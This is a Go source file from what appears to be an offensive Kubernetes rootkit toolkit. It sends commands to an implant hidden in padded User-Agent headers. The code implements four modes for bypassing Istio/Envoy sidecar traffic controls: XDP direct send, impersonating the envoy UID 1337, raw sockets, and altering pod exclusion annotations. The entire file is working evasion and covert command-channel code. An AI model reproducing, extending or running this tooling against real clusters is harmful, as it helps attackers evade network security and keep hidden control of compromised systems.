package meshbypass

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type MeshBypassResult struct {
	Mode   string `json:"mode"`
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(serverTarget, mode, meshTarget, output string) error {
	var result *MeshBypassResult

	switch mode {
	case "xdp":
		result = bypassXDP(serverTarget, meshTarget)
	case "uid":
		result = bypassUID(serverTarget, meshTarget)
	case "raw":
		result = bypassRaw(serverTarget, meshTarget)
	case "exclude":
		result = bypassExclude(serverTarget, meshTarget)
	default:
		return fmt.Errorf("unsupported mesh bypass mode: %s (use xdp, uid, raw, or exclude)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func bypassXDP(serverTarget, meshTarget string) *MeshBypassResult {
	cmd := fmt.Sprintf("mesh_xdp#%s", meshTarget)
	status := sendMeshCommand(serverTarget, cmd)
	return &MeshBypassResult{
		Mode:   "xdp",
		Target: meshTarget,
		Status: status,
		Detail: "XDP direct send bypasses iptables REDIRECT rules used by Istio/Envoy sidecar",
	}
}

func bypassUID(serverTarget, meshTarget string) *MeshBypassResult {
	cmd := fmt.Sprintf("mesh_uid#%s", meshTarget)
	status := sendMeshCommand(serverTarget, cmd)
	return &MeshBypassResult{
		Mode:   "uid",
		Target: meshTarget,
		Status: status,
		Detail: "run process as UID 1337 (envoy) to bypass Istio iptables exclusion rules",
	}
}

func bypassRaw(serverTarget, meshTarget string) *MeshBypassResult {
	cmd := fmt.Sprintf("mesh_raw#%s", meshTarget)
	status := sendMeshCommand(serverTarget, cmd)
	return &MeshBypassResult{
		Mode:   "raw",
		Target: meshTarget,
		Status: status,
		Detail: "send via raw socket to bypass iptables OUTPUT chain sidecar redirect",
	}
}

func bypassExclude(serverTarget, meshTarget string) *MeshBypassResult {
	cmd := fmt.Sprintf("mesh_exclude#%s", meshTarget)
	status := sendMeshCommand(serverTarget, cmd)
	return &MeshBypassResult{
		Mode:   "exclude",
		Target: meshTarget,
		Status: status,
		Detail: "modify pod traffic.sidecar.istio.io/excludeOutboundIPRanges annotation via K8s API",
	}
}

func sendMeshCommand(target, command string) string {
	ua := buildMeshUserAgent(command)

	req, err := http.NewRequest("GET", target+"/mesh_bypass", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "configured"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildMeshUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}
